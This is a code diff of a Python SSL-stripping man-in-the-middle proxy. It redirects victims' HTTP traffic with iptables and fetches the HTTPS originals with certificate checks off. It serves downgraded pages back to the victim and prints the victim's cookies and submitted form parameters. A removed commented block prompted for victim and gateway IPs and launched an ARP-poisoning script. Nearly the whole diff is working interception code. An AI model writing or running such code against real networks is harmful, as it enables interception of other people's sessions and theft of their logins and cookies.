@@ -25,17 +25,7 @@ file.close()
 
 print "redirecting all http traffic to port 8080"
 os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
-"""
-vIP = raw_input("Victim IP address?")
-gatewayIP = raw_input("Gateway IP address?")
-file = open("vIP.txt", "w+")
-file.write(vIP)
-file.close
-file = open("gatewayIP.txt", "w+")
-file.write(gatewayIP)
-file.close
-os.system("gnome-terminal -e 'python arpPoison.py'")
-"""
+
 
 #Starting the stripping process
 
@@ -43,8 +33,6 @@ def stripHTTPS(url, request):
 
     # Response message for the victim
     response = requests.models.Response()
-    print response.url
-    print response.url
     print response.url
 
     # Set HTTPstatuscode to 200 OK
@@ -54,7 +42,7 @@ def stripHTTPS(url, request):
     response.url = url
     
     print response.url
-    print response.url
+
 
     request2 = request.text
 
@@ -85,56 +73,67 @@ def stripHTTPS(url, request):
 
 class sslStripping(object):
     @cherrypy.expose
-    def default(self, *route):
+    def default(self, *route, **params):
 
         url = cherrypy.url()
-            
+        cookie = cherrypy.request.cookie
+        method = cherrypy.request.method
+        print "-----------"        
+        print params
+        print "-----------"
+        #cookie.clear()
+        print cookie
         print url
+        if "GET" in method:
+            if ".js" in url:
+        	    print ".js"
+         	    r = requests.get(url, verify=False)
+        	    r.headers.update({'Access-Control-Allow-Origin' : '*'})
+        	    print r.headers
+        	    return r.content
+            elif ".css" in url:
+        	    print ".css"
+        	    r = requests.get(url, verify=False)
+         	    r.headers.update({'Access-Control-Allow-Origin' : '*'})
+        	    print r.headers
+        	    return r.content
+            elif ".woff2" in url:
+                print ".woff2"
+                r = requests.put(url)
+                r.headers.update({'Access-Control-Allow-Origin' : '*'})
+                print r.headers
+                return r.content
+            else:
+                url = str(url).replace("http", "https")
+            
+            response = requests.get(url, verify=False)
+            cookies = cherrypy.response.cookie
+            print cookies
 
-        if ".js" in url:
-    	    print ".js"
-     	    r = requests.get(url, verify=False)
-    	    r.headers.update({'Access-Control-Allow-Origin' : '*'})
-    	    print "testttttt"
-    	    print r.headers
-    	    return r.content
-        elif ".css" in url:
-    	    print ".css"
-    	    r = requests.get(url, verify=False)
-     	    r.headers.update({'Access-Control-Allow-Origin' : '*'})
-    	    print "cssstestt"
-    	    print r.headers
-    	    return r.content
-        elif ".woff2" in url:
-            print ".woff2"
-            r = requests.put(url)
-            r.headers.update({'Access-Control-Allow-Origin' : '*'})
-            print ".woffteset"
-            print r.headers
-            return r.content
+            if(str(response.encoding) == "None"):
+                return response.content
+
+            print "Request made and returned status code: " +  str(response.status_code)
+            print "Response encoding: " + str(response.encoding)
+
+            print response.cookies
+            print "----------------------------------------------------" 
+            print response.headers        
+
+            response2 = stripHTTPS(url, response)
+
+            #response3 = stripSecureCookie(response2)
+            print response2
+            return response2.content
         else:
+            print params
             url = str(url).replace("http", "https")
-        
-        response = requests.get(url, verify=False)
+            response = requests.post(url, data = params)
+            print response.headers
+            response2 = stripHTTPS(url, response)
+            return response2.content
 
-        if(str(response.encoding) == "None"):
-            return response.content
-
-        print "Request made and returned status code: " +  str(response.status_code)
-        print "Response encoding: " + str(response.encoding)
-
-        print response.cookies
-        print " ---------------------------------------------------------------------------" 
-        print response.headers
-        if(str(response.encoding) == "None"):
-            return response.content
-
-        response2 = stripHTTPS(url, response)
-
-        #response3 = stripSecureCookie(response2)
-        print response2
-        return response2.content
-
+            
 
 
 if __name__ == '__main__':
